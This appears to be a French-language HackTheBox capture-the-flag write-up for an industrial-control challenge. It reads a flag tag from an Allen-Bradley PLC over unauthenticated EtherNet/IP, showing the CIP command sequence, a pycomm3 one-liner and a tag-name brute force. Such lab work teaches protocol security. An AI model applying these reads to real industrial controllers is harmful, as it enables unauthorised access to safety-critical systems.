# EtherTag — Writeup

| Info | Détail |
|------|--------|
| **Plateforme** | HackTheBox |
| **Catégorie** | ICS (EtherNet/IP · CIP) |
| **Difficulté** | Easy |
| **Cible** | `154.57.164.80:30375` |
| **Flag** | `HTB{3th3rn3t1p_pwn3d}` |

## TL;DR

Le service expose un automate Allen-Bradley 1756-L61/B via **EtherNet/IP (CIP)**, protocole
**sans aucune authentification**. Le flag est stocké dans un tag PLC nommé `flag`
(tableau d'INT, 1 entier = 1 caractère), lisible par un simple `ReadTag` CIP.

## Reconnaissance

```bash
curl -v --max-time 5 http://154.57.164.80:30375/   # pas du HTTP → timeout
```

`nmap` indisponible sur le poste (macOS) → probe en **sockets Python**. `List Identity` (cmd `0x63`) :

```
Vendor ID 1 (Rockwell/Allen-Bradley) · Device Type 14 (PLC) · Product '1756-L61/B LOGIX5561' · Rev 20.11
```

Catégorie confirmée : ICS / EtherNet/IP.

## Exploitation

Séquence EtherNet/IP minimale (sockets Python, aucun outil externe) :

```
Register Session (0x65)  → handle de session
SendRRData (0x6f) + CIP ReadTag (0x4c)
  path ANSI Extended Symbolic du tag 'flag' : \x91\x04 f l a g \x00
  count = 100
→ INT[] = [72,84,66,123,51,116,104,51,114,110,51,116,49,112,95,112,119,110,51,100,125,0,...]
→ ASCII  = HTB{3th3rn3t1p_pwn3d}
```

Confirmé indépendamment via `GetAttributeSingle` sur la classe Message Router (0x02),
même valeur en UTF-16-LE.

> En prod, `pycomm3` fait la même chose en une ligne :
> `CIPDriver('154.57.164.80:30375').read('flag')` (ici réimplémenté à la main faute d'outil).

## Impasses

- ~50 noms de tags testés (Status, secret, password…) → `0x05 Path Destination Unknown`.
  Seuls `flag`/`FLAG`/`Flag` existaient.

## Apprentissages clés

- EtherNet/IP v1/v2 = **zéro auth** (CIP Security seulement en v3.21+). Réf : CVE-2012-6435.
- Un tag PLC peut contenir le flag en clair → tenter directement `ReadTag`.
- Skill de référence : `ctf-misc` (protocoles industriels).

## Références
- CVE-2012-6435 · ICS-CERT ICSA-12-146-01
- `pycomm3`, `cpppo` (clients EtherNet/IP)
